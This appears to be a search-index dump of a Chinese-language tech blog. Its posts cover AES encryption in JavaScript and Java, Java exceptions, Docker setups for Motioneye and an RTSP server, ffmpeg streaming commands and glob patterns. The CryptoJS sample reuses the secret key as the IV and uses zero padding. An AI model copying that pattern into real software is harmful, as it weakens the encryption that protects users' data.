= 0; for( i","date":"2021-08-22","objectID":"/blog/posts/JavaScript-Java-%E5%AF%A6%E4%BD%9C-AES-CBC-NoPadding-%E5%8A%A0%E5%AF%86%E6%96%B9%E6%B3%95/:3:1","tags":["aes","cbc","nopadding","java","javascript"],"title":"JavaScript,Java 實作 AES/CBC/NoPadding 加密方法","uri":"/blog/posts/JavaScript-Java-%E5%AF%A6%E4%BD%9C-AES-CBC-NoPadding-%E5%8A%A0%E5%AF%86%E6%96%B9%E6%B3%95/"},{"categories":["加密"],"content":"JavaScript import * as CryptoJS from \"crypto-js\"; function encryptBase64StrByAES(data,key){ let cipher = CryptoJS.AES.encrypt(data, CryptoJS.enc.Utf8.parse(key), { iv: CryptoJS.enc.Utf8.parse(key), mode: CryptoJS.mode.CBC, padding: CryptoJS.pad.ZeroPadding }); return cipher.toString(); } function decryptBase64StrByAES(data, key){ // data = CryptoJS.enc.Base64.parse(data) // console.log('dd',data) let cipher = CryptoJS.AES.decrypt(data, CryptoJS.enc.Utf8.parse(key), { iv: CryptoJS.enc.Utf8.parse(key), mode: CryptoJS.mode.CBC, padding: CryptoJS.pad.ZeroPadding }); return cipher.toString(CryptoJS.enc.Utf8) } ","date":"2021-08-22","objectID":"/blog/posts/JavaScript-Java-%E5%AF%A6%E4%BD%9C-AES-CBC-NoPadding-%E5%8A%A0%E5%AF%86%E6%96%B9%E6%B3%95/:3:2","tags":["aes","cbc","nopadding","java","javascript"],"title":"JavaScript,Java 實作 AES/CBC/NoPadding 加密方法","uri":"/blog/posts/JavaScript-Java-%E5%AF%A6%E4%BD%9C-AES-CBC-NoPadding-%E5%8A%A0%E5%AF%86%E6%96%B9%E6%B3%95/"},{"categories":["加密"],"content":"要了解的知識 PRIVATEKEY:必須至少16個字元，最大32個字元，因為使用AES演算法，可以的話，最好給32個字比較安全 IV:必須至少16個字元，最大32個字元，因為使用AES演算法，可以的話，最好給32個字比較安全 HEX: Hex和Base64 - 疯狂的妞妞 - 博客园 URLBASE64 標準的Base64並不適合直接放在URL裡傳輸，因為URL編碼器會把標準Base64中的/和+字元變為形如%XX的形式，而這些%號在存入資料庫時還需要再進行轉換，因為ANSI SQL中已將%號用作萬用字元。 為解決此問題，可採用一種用於URL的改進Base64編碼，它不在末尾填充=號，並將標準Base64中的+和/分別改成了-和_，這樣就免去了在URL編解碼和資料庫儲存時所要做的轉換，避免了編碼資訊長度在此過程中的增加，並統一了資料庫、表單等處物件識別碼的格式。 另有一種用於正規表示式的改進Base64變種，它將+和/改成了!和-，因為+，*以及前面在IRCu中用到的[和]在正規表示式中都可能具有特殊含義。 參考: Base64 - 維基百科，自由的百科全書 ","date":"2021-08-22","objectID":"/blog/posts/JavaScript-Java-%E5%AF%A6%E4%BD%9C-AES-CBC-NoPadding-%E5%8A%A0%E5%AF%86%E6%96%B9%E6%B3%95/:4:0","tags":["aes","cbc","nopadding","java","javascript"],"title":"JavaScript,Java 實作 AES/CBC/NoPadding 加密方法","uri":"/blog/posts/JavaScript-Java-%E5%AF%A6%E4%BD%9C-AES-CBC-NoPadding-%E5%8A%A0%E5%AF%86%E6%96%B9%E6%B3%95/"},{"categories":["加密"],"content":"可以應用地方 token : 但這樣會不會有AES加密後長度會不一致??要怎麼用比較安全，有空來研究。 看起來有各式各樣方式。 目前比較正規是拿 sha256(userid+user_data…+sign_datetime) 產生一組 token ，sign_datetime需要儲存到db，這一組也不需要存到資料庫，到時候token 驗證用db sign_datetime 再做一次 sha256 encode方式測試是否有效，但這是一種 token 只能有一組方法。 另一種做法產生 UUID 然後存放到資料庫裡面，這也是以前比較常見方法。 JWT 也是最近最常用方式，userid放在jwt裡面，但是重要資訊不能放在上面，不知道這長度會不會一致，有時間再研究。 HTTP Header 不能超過 8kb ，這一點也要注意。 PHP 和 Web 端对称加密传输|JSEncrypt|CryptoJS | Laravel China 社区 简单理解token机制 | 人人都是产品经理 認識Cookie、Session、Token與JWT | Yang Yang 生成Token - 音视频通信 - 阿里云 传统token与Jwt区别及优缺点_qq_41369135的博客-CSDN博客_jwttoken优点与缺点 一次搞懂密碼學中的三兄弟 — Encode、Encrypt 跟 Hash | by Larry Lu | Starbugs Weekly 星巴哥技術專欄 | Medium JSON Web Token - 在Web应用间安全地传递信息 - 回田园 关于token验证几点不明白的地方-CSDN社区 理解 Keystone 的四种 Token Alvin Zhu - 关于 Token，你应该知道的十件事 Keystone Fernet Token解析 | 开心鬼 深入探討 JSON Web Token (JWT) - 墨冊 驗證信: 這樣應該就不用存 DB了，時間也可以存裡面，這樣也可以不用讀DB。 網路上大多數方法都是存在 DB，但我想用AES加密應該可行的，後來有找到有人實作。 java实现绑定邮箱与验证系统 | jay’s Blog ","date":"2021-08-22","objectID":"/blog/posts/JavaScript-Java-%E5%AF%A6%E4%BD%9C-AES-CBC-NoPadding-%E5%8A%A0%E5%AF%86%E6%96%B9%E6%B3%95/:5:0","tags":["aes","cbc","nopadding","java","javascript"],"title":"JavaScript,Java 實作 AES/CBC/NoPadding 加密方法","uri":"/blog/posts/JavaScript-Java-%E5%AF%A6%E4%BD%9C-AES-CBC-NoPadding-%E5%8A%A0%E5%AF%86%E6%96%B9%E6%B3%95/"},{"categories":["Java"],"content":"最近寫 Java 發現某個 MyBatis API 報錯，文件沒有寫會丟 Exception，但是 MyBatis DB 發生錯誤就會丟…，後來發現是我當出沒看好，所以趕快記錄一下。 文章重點取自 Java筆記 — Exception 與 Error. 這是個很老梗的問題了, 但每個階段回來看, 都會有不同的體會… | by Carl | Medium，建議看大神文章，可以呼略下面筆記。 備份圖 ","date":"2021-08-22","objectID":"/blog/posts/%E6%88%91%E5%A4%9A%E5%B9%B4%E5%BF%BD%E7%95%A5%E4%BA%86-Java-RuntimeException-%E8%A7%80%E5%BF%B5/:0:0","tags":["java","exception"],"title":"我多年忽略了 Java RuntimeException 觀念","uri":"/blog/posts/%E6%88%91%E5%A4%9A%E5%B9%B4%E5%BF%BD%E7%95%A5%E4%BA%86-Java-RuntimeException-%E8%A7%80%E5%BF%B5/"},{"categories":["Java"],"content":"Java 錯誤種類 Exception: 通常指程式運行時所出現的可預料之意外狀況, 基本上都要進行 catch 的動作, 然後進行相應處理, 如 IOException. Error: 指在正常情況下, 不太可能出現的問題, 絕大部分的 Error 都會導致程式 (e.g. JVM 本身) 處於一種不正常且不可恢復的狀態. 所以對於這種情況, 你也不太需要去 catch 了, 因為也沒什麼意義. 常見的如 OutOfMemoryError / StackOverflowError 這些, 都是繼承自 Error. ","date":"2021-08-22","objectID":"/blog/posts/%E6%88%91%E5%A4%9A%E5%B9%B4%E5%BF%BD%E7%95%A5%E4%BA%86-Java-RuntimeException-%E8%A7%80%E5%BF%B5/:1:0","tags":["java","exception"],"title":"我多年忽略了 Java RuntimeException 觀念","uri":"/blog/posts/%E6%88%91%E5%A4%9A%E5%B9%B4%E5%BF%BD%E7%95%A5%E4%BA%86-Java-RuntimeException-%E8%A7%80%E5%BF%B5/"},{"categories":["Java"],"content":"Java Exception(重點) Checked Exception: 又稱受檢例外, 通常在原始碼中必須顯式地 catch 並且處理, 這部分算是 compile time 會檢查的部分. Unchecked Exception: 又稱非受檢例外, 就是所謂的 RuntimeException, 常見的像是 NullPointerException, ArrayIndexOutOfBoundsException. 這種類型的例外通常是可以透過撰寫相應程式以避免的邏輯錯誤, 可以根據當下的情境來判斷是不是要 catch, 且在 compile time 並不會強制要求要 catch. ","date":"2021-08-22","objectID":"/blog/posts/%E6%88%91%E5%A4%9A%E5%B9%B4%E5%BF%BD%E7%95%A5%E4%BA%86-Java-RuntimeException-%E8%A7%80%E5%BF%B5/:2:0","tags":["java","exception"],"title":"我多年忽略了 Java RuntimeException 觀念","uri":"/blog/posts/%E6%88%91%E5%A4%9A%E5%B9%B4%E5%BF%BD%E7%95%A5%E4%BA%86-Java-RuntimeException-%E8%A7%80%E5%BF%B5/"},{"categories":["Java"],"content":"原因出在 RuntimeException 這邊RuntimeException程式執行時候才會丟 Exception ，這邊就要想想什麼時候要做 Exception ，說真的目前遇到公司都會丟 throw Exception(這邊是公司底層 Dao 都會丟 Exception)，編輯器都會跟你說要add throw Exception 到 method，因為丟會防止程式問題，要怎麼處理 RuntimeException 這是一個好問題，有時間再整理。 ","date":"2021-08-22","objectID":"/blog/posts/%E6%88%91%E5%A4%9A%E5%B9%B4%E5%BF%BD%E7%95%A5%E4%BA%86-Java-RuntimeException-%E8%A7%80%E5%BF%B5/:2:1","tags":["java","exception"],"title":"我多年忽略了 Java RuntimeException 觀念","uri":"/blog/posts/%E6%88%91%E5%A4%9A%E5%B9%B4%E5%BF%BD%E7%95%A5%E4%BA%86-Java-RuntimeException-%E8%A7%80%E5%BF%B5/"},{"categories":["Java"],"content":"相關 RuntimeException 文章 菜鳥工程師 肉豬: Spring Web 處理存取資料庫例外錯誤 handle database access exception [備份圖] RuntimeException和Exception区别 - jtlgb - 博客园 java - Why is catching a RuntimeException not considered a good programming practice? - Stack Overflow ","date":"2021-08-22","objectID":"/blog/posts/%E6%88%91%E5%A4%9A%E5%B9%B4%E5%BF%BD%E7%95%A5%E4%BA%86-Java-RuntimeException-%E8%A7%80%E5%BF%B5/:3:0","tags":["java","exception"],"title":"我多年忽略了 Java RuntimeException 觀念","uri":"/blog/posts/%E6%88%91%E5%A4%9A%E5%B9%B4%E5%BF%BD%E7%95%A5%E4%BA%86-Java-RuntimeException-%E8%A7%80%E5%BF%B5/"},{"categories":["Java"],"content":"日常接觸 Exception 處理 ","date":"2021-08-22","objectID":"/blog/posts/%E6%88%91%E5%A4%9A%E5%B9%B4%E5%BF%BD%E7%95%A5%E4%BA%86-Java-RuntimeException-%E8%A7%80%E5%BF%B5/:4:0","tags":["java","exception"],"title":"我多年忽略了 Java RuntimeException 觀念","uri":"/blog/posts/%E6%88%91%E5%A4%9A%E5%B9%B4%E5%BF%BD%E7%95%A5%E4%BA%86-Java-RuntimeException-%E8%A7%80%E5%BF%B5/"},{"categories":["Java"],"content":"Spring Boot Transactional 我常常在工作中會把 Spring Boot Transactional 交易改成Exception，公司底層也是這樣寫，是因為怕程式錯誤沒有 rollback 會造成這樣，但我想最正確寫法。 Hibernate 和 Spring Boot JPA 做 @Transactional 不一樣 session.close 時機 | 程式狂想筆記 Spring 交易事務失效 | 程式狂想筆記 詳細瞭解 Spring Transaction 的 Propagation 備份圖 ","date":"2021-08-22","objectID":"/blog/posts/%E6%88%91%E5%A4%9A%E5%B9%B4%E5%BF%BD%E7%95%A5%E4%BA%86-Java-RuntimeException-%E8%A7%80%E5%BF%B5/:4:1","tags":["java","exception"],"title":"我多年忽略了 Java RuntimeException 觀念","uri":"/blog/posts/%E6%88%91%E5%A4%9A%E5%B9%B4%E5%BF%BD%E7%95%A5%E4%BA%86-Java-RuntimeException-%E8%A7%80%E5%BF%B5/"},{"categories":["Java"],"content":"感想 大概看了一些文章，處理 DB 應該不需要處理RuntimeException，也應該不需要 Excepion，也許你改成Exception時候代表程式沒有寫好(程式單一原則)，不該把Runtime Exception程式碼放在裡面。 我目前看到結果大概是這樣，有問題再補。 題外話，其實幾個月前我就有打算整理這篇，最近學 Lamdba 遇到 Exception 問題，所以想到這個還沒有整理，之後還要整理 Lamdba 怎麼處理 Exception 問題。 ","date":"2021-08-22","objectID":"/blog/posts/%E6%88%91%E5%A4%9A%E5%B9%B4%E5%BF%BD%E7%95%A5%E4%BA%86-Java-RuntimeException-%E8%A7%80%E5%BF%B5/:5:0","tags":["java","exception"],"title":"我多年忽略了 Java RuntimeException 觀念","uri":"/blog/posts/%E6%88%91%E5%A4%9A%E5%B9%B4%E5%BF%BD%E7%95%A5%E4%BA%86-Java-RuntimeException-%E8%A7%80%E5%BF%B5/"},{"categories":["Linux"],"content":"原本想研究MieszkoMakuch/pi-security-camera: University project: Smart security camera on raspberry pi with email notifications and web interface，來當做監視器，但前置作業就要先搞好 OpenCV，最近看到 HomeLab.001 樹莓派ARM架構升級版 ODROID N2 搭建多功能服務器 這篇提到 Motioneye (影像監視) ，看介紹感覺都符合我要使用的。 ","date":"2021-08-22","objectID":"/blog/posts/Motioneye-%E8%A9%A6%E7%94%A8%E5%B0%8F%E8%A8%98/:0:0","tags":["camera","motioneye","docker"],"title":"使用 Docker 架設 Motioneye 試用小記","uri":"/blog/posts/Motioneye-%E8%A9%A6%E7%94%A8%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"網路上教學 Raspberry Pi 筆記(68)：影像監視系統motioneye | 天花板隨記 用 Raspberry pi 做一個網路監控系統吧！ - 叩頂窩客 好多人都有拿來用，目前我先用筆電小試。 ","date":"2021-08-22","objectID":"/blog/posts/Motioneye-%E8%A9%A6%E7%94%A8%E5%B0%8F%E8%A8%98/:1:0","tags":["camera","motioneye","docker"],"title":"使用 Docker 架設 Motioneye 試用小記","uri":"/blog/posts/Motioneye-%E8%A9%A6%E7%94%A8%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"簡單使用 Docker 官網就有 Docker 實作，我這邊先整理我在筆電執行的指令。 docker run --name=\"motioneye\" \\ --device=/dev/video0 \\ -p 8765:8765 \\ --hostname=\"motioneye\" \\ -v /etc/localtime:/etc/localtime:ro \\ -v /etc/motioneye:/etc/motioneye \\ -v /var/lib/motioneye:/var/lib/motioneye \\ --restart=\"always\" \\ --detach=true \\ ccrisan/motioneye:master-amd64 這樣就完成了。 這邊注意，/dev/video0 是指你的攝像頭。 去 http://192.168.1.111:8765進去介面，帳號/密碼為 admin/(空白)，進去新增Camera 就能完成。沒想到還滿快的。 ","date":"2021-08-22","objectID":"/blog/posts/Motioneye-%E8%A9%A6%E7%94%A8%E5%B0%8F%E8%A8%98/:2:0","tags":["camera","motioneye","docker"],"title":"使用 Docker 架設 Motioneye 試用小記","uri":"/blog/posts/Motioneye-%E8%A9%A6%E7%94%A8%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"失敗小記 我原先去 Docker Hub 找 jshridha/motioneye - Docker Image | Docker Hub，但執行不能成功。 但我發現，指令跟官方有差異。 docker run -d --name=motioneye \\ --device=/dev/video0 \\ -p 8081:8081 \\ -p 8765:8765 \\ -e TIMEZONE=\"America/New_York\" \\ -e PUID=\"99\" \\ -e PGID=\"100\" \\ -v /mnt/user/appdata/motioneye/media:/home/nobody/media \\ -v /mnt/user/appdata/motioneye/config:/config \\ jshridha/motioneye:latest -e PUID=\"99\" \\ -e PGID=\"100\" \\ 這個好像跟攝像頭權限有關係，但在我機器要使用 -e PUID=\"0\" \\ -e PGID=\"0\" \\ 不知道為什麼官方就可以不用加??? ","date":"2021-08-22","objectID":"/blog/posts/Motioneye-%E8%A9%A6%E7%94%A8%E5%B0%8F%E8%A8%98/:3:0","tags":["camera","motioneye","docker"],"title":"使用 Docker 架設 Motioneye 試用小記","uri":"/blog/posts/Motioneye-%E8%A9%A6%E7%94%A8%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"未來研究 NOTE Line / Disocrd 通知、Email 通知 智米攝影機 改機(RTSP) 小方智慧攝影機 改機支援RTSP (加映Surveillance Station設定) - Mobile01 samtap/fang-hacks: Collection of modifications for the XiaoFang WiFi Camera Modify the Xiaomi Xiaofang Camera to Work With Home Assistant and Other Video Recording Software | Automated Home Party 米家智慧攝影機1080P 改機支援RTSP (Surveillance Station設定) - Mobile01 Release 0.8.7 RTSP working back (Tested) · Filipowicz251/mijia-1080P-hacks telmomarques/xiaomi-360-1080p-hacks: Hacks for the Xiaomi Mi 360 1080p camera (MJSXJ02CM). http://bobbyromeo.com/home-automation/xiaomi-smart-1080p-wifi-ip-camera-rtsp-streaming-hack/#firmware 還在猶豫刷機還是買支援RSTP 的 IP Camera，刷機沒法刷回台版。有機會無法用米家APP操作。 當然也有考慮找支援RSTP 協定的攝影機。 ","date":"2021-08-22","objectID":"/blog/posts/Motioneye-%E8%A9%A6%E7%94%A8%E5%B0%8F%E8%A8%98/:4:0","tags":["camera","motioneye","docker"],"title":"使用 Docker 架設 Motioneye 試用小記","uri":"/blog/posts/Motioneye-%E8%A9%A6%E7%94%A8%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"最近打算 Raspberry Camera 或 小米攝影機做監控發送訊息通知，所以先行研究 RSTP，想說之後串 OpenCV 可以先測試結果，不過沒想到 RTSP Server 就搞了那麼久…。 彩蛋就先放這: 我Raspberry PI Camera 找的方案 MieszkoMakuch/pi-security-camera: University project: Smart security camera on raspberry pi with email notifications and web interface (1) How to Make a Smart Security Camera with a Raspberry Pi Zero - YouTube chollinger93/scarecrow: A Raspberry Pi powered, distributed (edge) computing camera setups that runs a Tensorflow object detection model to determine whether a person is on the camera. A plugin model allows actions based on the detection, such as playing audio, turning on lights, or triggering an Arduino. (1) Raspberry Pi Camera VS NOIR Camera - YouTube shbatm/MMM-RTSPStream: MagicMirror² module for streaming an RTSP video stream from a security camera to your MagicMirror. 結果我後來放棄這個方案，使用打算使用 Motioneye。 ","date":"2021-08-22","objectID":"/blog/posts/Raspberry-pi-%E6%94%9D%E5%BD%B1%E6%A9%9F%E8%A8%88%E7%95%AB/:0:0","tags":["pi","camera","raspberry"],"title":"Raspberry PI 攝影機計畫之新手簡單架設 HLS 和 RTSP Server","uri":"/blog/posts/Raspberry-pi-%E6%94%9D%E5%BD%B1%E6%A9%9F%E8%A8%88%E7%95%AB/"},{"categories":["Linux"],"content":"專有名詞 可以看Streaming 通訊協定 RTP RTCP RTSP RTMP HLS 介紹 | Jason note，之前也因為好奇有小記，但沒有實作。hls影音串流小記 | 程式狂想筆記 (1) 直播 小米監視器的畫面 比較不同播放器 2種協定 RTMP HLS 的延遲時間比較 - YouTube ","date":"2021-08-22","objectID":"/blog/posts/Raspberry-pi-%E6%94%9D%E5%BD%B1%E6%A9%9F%E8%A8%88%E7%95%AB/:1:0","tags":["pi","camera","raspberry"],"title":"Raspberry PI 攝影機計畫之新手簡單架設 HLS 和 RTSP Server","uri":"/blog/posts/Raspberry-pi-%E6%94%9D%E5%BD%B1%E6%A9%9F%E8%A8%88%E7%95%AB/"},{"categories":["Linux"],"content":"rtsp-simple-server 架設成功，簡單小記一下。 ","date":"2021-08-22","objectID":"/blog/posts/Raspberry-pi-%E6%94%9D%E5%BD%B1%E6%A9%9F%E8%A8%88%E7%95%AB/:2:0","tags":["pi","camera","raspberry"],"title":"Raspberry PI 攝影機計畫之新手簡單架設 HLS 和 RTSP Server","uri":"/blog/posts/Raspberry-pi-%E6%94%9D%E5%BD%B1%E6%A9%9F%E8%A8%88%E7%95%AB/"},{"categories":["Linux"],"content":"Github https://github.com/Ullaakut/RTSPAllTheThings https://github.com/aler9/rtsp-simple-server ","date":"2021-08-22","objectID":"/blog/posts/Raspberry-pi-%E6%94%9D%E5%BD%B1%E6%A9%9F%E8%A8%88%E7%95%AB/:2:1","tags":["pi","camera","raspberry"],"title":"Raspberry PI 攝影機計畫之新手簡單架設 HLS 和 RTSP Server","uri":"/blog/posts/Raspberry-pi-%E6%94%9D%E5%BD%B1%E6%A9%9F%E8%A8%88%E7%95%AB/"},{"categories":["Linux"],"content":"安裝過程 docker 架設 Server UDP會有問題。所以使用 Docker 要設定 TCP 選項。 參考這個:video - Streaming RTSP with ffmpeg? - Super User rtsp-simple-server.yml 設定 tcp。 protocols: [tcp] 啟動 Container，這邊使用 host 模式，所以對印 IP 是原主機 IP。 docker run --rm -it -v $PWD/rtsp-simple-server.yml:/rtsp-simple-server.yml --network=host aler9/rtsp-simple-server live/streamname 可以自已改路徑 ffmpeg -re -stream_loop -1 -i test.mp4 -f rtsp -rtsp_transport tcp rtsp://localhost:8554/live/streamname hfs 看直播 http://192.168.1.111:8888/live/afd/ 簡單就完成了 ","date":"2021-08-22","objectID":"/blog/posts/Raspberry-pi-%E6%94%9D%E5%BD%B1%E6%A9%9F%E8%A8%88%E7%95%AB/:2:2","tags":["pi","camera","raspberry"],"title":"Raspberry PI 攝影機計畫之新手簡單架設 HLS 和 RTSP Server","uri":"/blog/posts/Raspberry-pi-%E6%94%9D%E5%BD%B1%E6%A9%9F%E8%A8%88%E7%95%AB/"},{"categories":["Linux"],"content":"OBS 設定 簡單新增一個影片 DEMO，然後設定串流。 這邊伺服器就是 rtmp-server IP(注意不是 RSTP)，這邊讓我卡了很久，不過是我沒看清楚教學設定。orz 串流金鑰其實就是路徑。 ","date":"2021-08-22","objectID":"/blog/posts/Raspberry-pi-%E6%94%9D%E5%BD%B1%E6%A9%9F%E8%A8%88%E7%95%AB/:3:0","tags":["pi","camera","raspberry"],"title":"Raspberry PI 攝影機計畫之新手簡單架設 HLS 和 RTSP Server","uri":"/blog/posts/Raspberry-pi-%E6%94%9D%E5%BD%B1%E6%A9%9F%E8%A8%88%E7%95%AB/"},{"categories":["Linux"],"content":"相關路徑 這邊路徑是設定mystream，相對 hls 設定 http://192.168.1.111:8888/mystream/就能看了。 hls hls: http://192.168.1.111:8888/mystream/ m3u8 路徑: http://192.168.1.111:8888/mystream/stream.m3u8 rtmp rtmp 路徑: rtmp://192.168.1.111/mystream ","date":"2021-08-22","objectID":"/blog/posts/Raspberry-pi-%E6%94%9D%E5%BD%B1%E6%A9%9F%E8%A8%88%E7%95%AB/:3:1","tags":["pi","camera","raspberry"],"title":"Raspberry PI 攝影機計畫之新手簡單架設 HLS 和 RTSP Server","uri":"/blog/posts/Raspberry-pi-%E6%94%9D%E5%BD%B1%E6%A9%9F%E8%A8%88%E7%95%AB/"},{"categories":["Linux"],"content":"失敗記錄(請跳過) https://github.com/aler9/rtsp-simple-server/issues/39 http://hxz.ink/2016/04/06/broken-pipe/ http://dacongyun.com/archives/231146.html https://blog.csdn.net/chy555chy/article/details/ 我想问下 rtsp 转 rtmp 怎么解决多个监控摄像头同时转 cpu 过高的问题 - V2EX 最後用這個解決video - Streaming RTSP with ffmpeg? - Super User 不過有聲音沒畫面…. ","date":"2021-08-22","objectID":"/blog/posts/Raspberry-pi-%E6%94%9D%E5%BD%B1%E6%A9%9F%E8%A8%88%E7%95%AB/:3:2","tags":["pi","camera","raspberry"],"title":"Raspberry PI 攝影機計畫之新手簡單架設 HLS 和 RTSP Server","uri":"/blog/posts/Raspberry-pi-%E6%94%9D%E5%BD%B1%E6%A9%9F%E8%A8%88%E7%95%AB/"},{"categories":["Linux"],"content":"影片直播 ffmpeg -re -stream_loop -1 -i test.mp4 -vcodec libx264 -acodec aac -f flv rtmp://192.168.1.111/live/afd ","date":"2021-08-22","objectID":"/blog/posts/Raspberry-pi-%E6%94%9D%E5%BD%B1%E6%A9%9F%E8%A8%88%E7%95%AB/:4:0","tags":["pi","camera","raspberry"],"title":"Raspberry PI 攝影機計畫之新手簡單架設 HLS 和 RTSP Server","uri":"/blog/posts/Raspberry-pi-%E6%94%9D%E5%BD%B1%E6%A9%9F%E8%A8%88%E7%95%AB/"},{"categories":["Linux"],"content":"nginx-rtmp Nginx+RTMP/HLS docker image 備份圖 docker run --rm -p 1935:1935 -p 8888:8080 jasonrivers/nginx-rtmp ~~失敗。這邊教學照做不知道為什麼不行….~~我眼殘，OBS設定串流用成 RTSP，記得選 RTSP ","date":"2021-08-22","objectID":"/blog/posts/Raspberry-pi-%E6%94%9D%E5%BD%B1%E6%A9%9F%E8%A8%88%E7%95%AB/:5:0","tags":["pi","camera","raspberry"],"title":"Raspberry PI 攝影機計畫之新手簡單架設 HLS 和 RTSP Server","uri":"/blog/posts/Raspberry-pi-%E6%94%9D%E5%BD%B1%E6%A9%9F%E8%A8%88%E7%95%AB/"},{"categories":["Linux"],"content":"ffmpeg rtsp 转 ts文件 .m3u8的方式_CSDN_Wolf_HQ的博客-CSDN博客 ffmpeg 抓取rtmp流_Dovake的博客-CSDN博客 ","date":"2021-08-22","objectID":"/blog/posts/Raspberry-pi-%E6%94%9D%E5%BD%B1%E6%A9%9F%E8%A8%88%E7%95%AB/:6:0","tags":["pi","camera","raspberry"],"title":"Raspberry PI 攝影機計畫之新手簡單架設 HLS 和 RTSP Server","uri":"/blog/posts/Raspberry-pi-%E6%94%9D%E5%BD%B1%E6%A9%9F%E8%A8%88%E7%95%AB/"},{"categories":["Linux"],"content":"linux /window 抓攝影機 windows : 可以使用 choco 安裝，或者去官方抓檔案下載，並且設定環境變數path 列裝置 ffmpeg -list_devices true -f dshow -i dummy 這邊可以看到，我的攝影機名稱為「HP TrueVision HD Camera」 編碼為H.264，儲存為本地檔案 ffmpeg -f dshow -i video=\"Integrated Camera\" -vcodec libx264 mycamera.mkv 播放 ffplay -f dshow -i video=\"Integrated Camera\" linux : 看格式，要使用 root ffmpeg -f v4l2 -list_formats all -i /dev/video0 錄影 ffmpeg -f v4l2 -framerate 25 -video_size 640x480 -i /dev/video0 output.mkv 轉 rtmp ，不知道網的相機太爛?hls 網頁看不到畫面(一直轉)， Potplayer 可以看到內容。 ffmpeg -f v4l2 -framerate 25 -video_size 640x480 -i /dev/video0 -vcodec libx264 -acodec aac -f flv rtmp://192.168.1.111/live/afd window 無法用不知道為什麼，還遇到各種奇奇怪怪狀況，所以放棄測試。 ffmpeg -y -rtbufsize 100M -f dshow -i video=\"HP TrueVision HD Camera\" -vcodec libx264 -acodec aac -f flv rtmp://192.168.1.111/live/sss ","date":"2021-08-22","objectID":"/blog/posts/Raspberry-pi-%E6%94%9D%E5%BD%B1%E6%A9%9F%E8%A8%88%E7%95%AB/:6:1","tags":["pi","camera","raspberry"],"title":"Raspberry PI 攝影機計畫之新手簡單架設 HLS 和 RTSP Server","uri":"/blog/posts/Raspberry-pi-%E6%94%9D%E5%BD%B1%E6%A9%9F%E8%A8%88%E7%95%AB/"},{"categories":["Linux"],"content":"常常看到一堆人搜尋會用到**/*.php(ex: ./gitignore)，這看起來不向正規化，最近再用 VSCODE 再找類似正規畫套用查詢，結果發現 vscode 查詢適用 glob 。 No regular expression support for files to include in search. · Issue #36882 · microsoft/vscode ","date":"2021-08-22","objectID":"/blog/posts/glob-%E6%90%9C%E5%B0%8B%E5%8C%B9%E9%85%8D%E8%A6%8F%E5%89%87/:0:0","tags":["linux","bash","glob"],"title":"glob 搜尋匹配規則","uri":"/blog/posts/glob-%E6%90%9C%E5%B0%8B%E5%8C%B9%E9%85%8D%E8%A6%8F%E5%89%87/"},{"categories":["Linux"],"content":"網路上教學 Gulp 學習筆記 - Glob 篇 | 格物致知 感覺是大坑，裡面還滿詳細的，有用到進階在學。 ","date":"2021-08-22","objectID":"/blog/posts/glob-%E6%90%9C%E5%B0%8B%E5%8C%B9%E9%85%8D%E8%A6%8F%E5%89%87/:1:0","tags":["linux","bash","glob"],"title":"glob 搜尋匹配規則","uri":"/blog/posts/glob-%E6%90%9C%E5%B0%8B%E5%8C%B9%E9%85%8D%E8%A6%8F%E5%89%87/"},{"categories":["Linux"],"content":"排除方法 沒有找到在前面排除方法，但有找到在中間排除。但我看這種方法還是少用，像是 VSCode 有排除選項可以選。 /src/**/!(els)/*.scss 參考:Any way to ignore/exclude a file or folder? · Issue #24 · mysticatea/cpx 後來發現可以做到，/**/!(xxx.js)要這樣設定才有效，這樣!(/**/xxx.js)沒效 Glob online tester ","date":"2021-08-22","objectID":"/blog/posts/glob-%E6%90%9C%E5%B0%8B%E5%8C%B9%E9%85%8D%E8%A6%8F%E5%89%87/:2:0","tags":["linux","bash","glob"],"title":"glob 搜尋匹配規則","uri":"/blog/posts/glob-%E6%90%9C%E5%B0%8B%E5%8C%B9%E9%85%8D%E8%A6%8F%E5%89%87/"},{"categories":["Linux"],"content":"globstar Linux 想說怎麼沒法用，原來預設關閉。 Globstar: New Bash Globbing Option | Linux Journal Java 语言 Glob 语法规则 感覺能跟這個搭配Remove a Specific Element from an Array in Bash – Linux Hint，可以做到 exlcude 功能。 ","date":"2021-08-22","objectID":"/blog/posts/glob-%E6%90%9C%E5%B0%8B%E5%8C%B9%E9%85%8D%E8%A6%8F%E5%89%87/:3:0","tags":["linux","bash","glob"],"title":"glob 搜尋匹配規則","uri":"/blog/posts/glob-%E6%90%9C%E5%B0%8B%E5%8C%B9%E9%85%8D%E8%A6%8F%E5%89%87/"},{"categories":["Linux"],"content":"模式匹配 ?(pattern-list)：匹配0個或1個pattern *(pattern-list)：匹配0個或以上的patterns +(pattern-list)：匹配1個或以上的patterns @(pattern-list)：只匹配1個pattern !(pattern-list)：匹配任何與pattern不一樣的patterns 其實看中文敘述不是很懂，但實作後發現就懂他的匹配是什麼意思，直接範例 參考:阿就操場啊~: 延伸檔名匹配 Extended Pattern Matching ","date":"2021-08-22","objectID":"/blog/posts/glob-%E6%90%9C%E5%B0%8B%E5%8C%B9%E9%85%8D%E8%A6%8F%E5%89%87/:4:0","tags":["linux","bash","glob"],"title":"glob 搜尋匹配規則","uri":"/blog/posts/glob-%E6%90%9C%E5%B0%8B%E5%8C%B9%E9%85%8D%E8%A6%8F%E5%89%87/"},{"categories":["Linux"],"content":"?(ab|def)?(.jpg|.gif) ?(pattern-list)：匹配0個或1個pattern Glob Tool | DigitalOcean ","date":"2021-08-22","objectID":"/blog/posts/glob-%E6%90%9C%E5%B0%8B%E5%8C%B9%E9%85%8D%E8%A6%8F%E5%89%87/:4:1","tags":["linux","bash","glob"],"title":"glob 搜尋匹配規則","uri":"/blog/posts/glob-%E6%90%9C%E5%B0%8B%E5%8C%B9%E9%85%8D%E8%A6%8F%E5%89%87/"},{"categories":["Linux"],"content":"*(ab|def)*(.jpg|.gif) *(ab|def)*(.jpg|.gif) *(pattern-list)：匹配0個或以上的patterns Glob Tool | DigitalOcean 我這邊還不太了解為什麼 xxx.jpg 沒有被抓到，匹配0個或以上都可以抓到，那不是應該都能抓到嗎??但我猜測所有條件下還是要抓到一個，就能顯示。 